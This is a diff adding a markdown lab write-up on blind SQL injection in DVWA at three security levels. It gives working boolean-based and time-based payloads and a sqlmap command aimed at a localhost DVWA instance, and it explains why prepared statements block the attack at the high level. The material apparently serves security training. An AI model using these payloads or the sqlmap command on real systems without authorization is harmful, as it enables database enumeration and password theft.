@@ -1,0 +1,142 @@
+# 2️ SQL Injection (Blind)
+
+Blind SQLi = **No direct output**, attacker infers data using **true/false or time delays**.
+
+---
+
+## LOW Level – Blind SQLi
+
+### Why it is Vulnerable
+
+* No output shown
+* SQL query still injectable
+* Boolean & time-based attacks possible
+
+---
+
+### Boolean-Based Payloads
+
+#### TRUE condition
+
+```sql
+1' AND 1=1 --
+```
+
+#### FALSE condition
+
+```sql
+1' AND 1=2 --
+```
+
+Page loads → TRUE
+Page blank → FALSE
+
+---
+
+### Time-Based Payload
+
+```sql
+1' AND SLEEP(5) --
+```
+
+⏳ 5-second delay confirms vulnerability
+
+---
+
+### Impact
+
+* Database enumeration possible
+* Password extraction possible via automation
+
+---
+
+### Severity: **High**
+
+---
+
+## MEDIUM Level – Blind SQLi
+
+### Why it Still Works
+
+* Some filtering applied
+* Still vulnerable to **time-based SQLi**
+* Error messages suppressed
+
+---
+
+### Payloads
+
+#### Boolean-based
+
+```sql
+1 AND 1=1
+```
+
+#### Time-based
+
+```sql
+1 AND IF(1=1, SLEEP(5), 0)
+```
+
+---
+
+### Result
+
+* Injection successful
+* Slower exploitation
+* Requires automation
+
+
+---
+
+### Impact
+
+* Sensitive data extraction
+* Stealthy attack
+
+---
+
+### Severity: **Medium**
+
+---
+
+## HIGH Level – Blind SQLi
+
+### Why it is Secure
+
+* Prepared statements
+* Strong validation
+* No injectable parameters
+
+---
+
+### Payload
+
+```sql
+1 AND SLEEP(5)
+```
+
+---
+
+### Result
+
+ No delay
+ No response difference
+ Injection prevented
+
+---
+
+### Severity: **Low (Secure)**
+
+---
+
+
+
+# SQLMap Proof (Low Level)
+
+### Blind SQL Injection
+
+```bash
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
+--cookie="security=low; PHPSESSID=xxxx" --technique=BT
+```
